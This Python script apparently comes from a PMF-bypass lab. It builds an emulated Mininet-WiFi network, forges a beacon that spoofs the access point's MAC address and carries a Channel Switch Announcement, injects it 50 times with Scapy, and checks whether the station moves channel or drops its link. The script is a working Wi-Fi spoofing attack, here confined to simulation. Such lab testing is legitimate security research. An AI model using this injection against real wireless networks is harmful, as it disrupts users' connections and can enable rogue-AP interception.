#!/usr/bin/env python3
"""Test: send CSA Beacon from AP side (different interface) to reach station."""
import sys, os, time, re
sys.path.insert(0, '/home/agent/pmf-bypass-lab-infra')
from mn_wifi.net import Mininet_wifi
from mn_wifi.link import wmediumd
from mn_wifi.wmediumdConnector import interference
from mininet.log import setLogLevel, info

setLogLevel("info")

net = Mininet_wifi(link=wmediumd, wmediumd_mode=interference)
ap1 = net.addAccessPoint("ap1", ssid="TestCSA", mode="g", channel="6", failMode="standalone")
sta1 = net.addStation("sta1")
net.setPropagationModel(model="logDistance", exp=3.5)
net.configureNodes()
net.addLink(ap1, sta1)
net.start()
time.sleep(5)

# Find interfaces
def get_ifaces(node):
    ifaces = {}
    r = node.cmd("iw dev 2>&1")
    cur = None
    for line in r.split("\n"):
        if "Interface" in line:
            cur = line.strip().split()[1]
        elif "addr" in line and cur:
            ifaces[cur] = line.strip().split()[1]
        elif "type" in line and cur:
            if cur not in ifaces:
                ifaces[cur] = line.strip().split()
    return ifaces

ap_ifs = get_ifaces(ap1)
sta_ifs = get_ifaces(sta1)

info(f"AP ifaces: {list(ap_ifs.keys())}\n")
info(f"STA ifaces: {list(sta_ifs.keys())}\n")

# AP interface: ap1-wlan1 (type AP, SSID TestCSA, channel 6)
ap_ap_mac = ap_ifs.get("ap1-wlan1", "02:00:00:00:02:00")
# Station interface: wlan0
sta_mac = sta_ifs.get("wlan0", "00:00:00:00:00:01")

# For injection, use any unused managed interface on AP (wlan1 or wlan3)
inject_iface = "wlan1"
if "wlan1" not in ap_ifs:
    for k in ap_ifs:
        if k not in ["ap1-wlan1"]:
            inject_iface = k
            break

info(f"Injecting from AP:{inject_iface}, spoofing AP_MAC={ap_ap_mac}, target={sta_mac}\n")

# Send CSA Beacon from AP's unused managed interface
csa_body = bytes([0x01, 11, 1])
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt

beacon = RadioTap() / Dot11(
    type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_ap_mac, addr3=ap_ap_mac
) / Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) \
  / Dot11Elt(ID="SSID", info=b"TestCSA") \
  / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') \
  / Dot11Elt(ID="DSset", info=bytes([6])) \
  / Dot11Elt(ID=37, info=csa_body)

pkt_hex = bytes(beacon).hex()

scapy_cmd = f"""
python3 -c "
from scapy.all import RadioTap, sendp
pkt = RadioTap(bytes.fromhex('{pkt_hex}'))
sendp(pkt, iface='{inject_iface}', count=50, inter=0.05, verbose=False)
print('SENT:50')
"
"""

# Send from AP node
info(f"Sending 50 Beacon CSA from AP:{inject_iface}...\n")
ap1.cmd(f"ip link set {inject_iface} up 2>&1")
result = ap1.cmd(scapy_cmd)
info(f"Result: {result.strip()}\n")

time.sleep(5)

# Check if sta1 received and processed
info(f"STA channel after: {sta1.cmd('iw dev wlan0 info 2>&1 | grep -E channel|type|ssid')}\n")
info(f"STA link: {sta1.cmd('iw dev wlan0 link')}\n")
info(f"STA IP: {sta1.IP()}\n")

# Check wmediumd stats for any drops
info(f"AP wmediumd stats: {ap1.cmd('iw dev 2>&1 | head -5')}\n")

net.stop()
